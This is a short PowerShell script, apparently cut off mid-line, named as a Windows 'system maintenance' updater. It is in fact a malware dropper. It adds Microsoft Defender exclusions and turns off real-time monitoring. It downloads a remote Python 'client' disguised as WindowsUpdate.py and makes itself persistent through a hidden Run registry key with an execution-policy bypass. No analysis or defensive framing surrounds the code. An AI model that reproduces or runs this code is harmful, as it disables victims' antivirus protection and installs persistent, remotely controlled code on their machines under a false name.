# SYSUPDATER.ps1 - Windows System Maintenance
$scriptPath = "$env:TEMP\WindowsUpdate.py"
$url = "https://raw.githubusercontent.com/glitech01x/client/refs/heads/main/client.py"

# Add to Defender exclusions
Add-MpPreference -ExclusionPath $scriptPath -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue

# Download agent
(New-Object System.Net.WebClient).DownloadFile($url, $scriptPath)

# Add persistence
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $regPath -Name "SYSUPDATER" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Force

# Run agent
$psi = New-
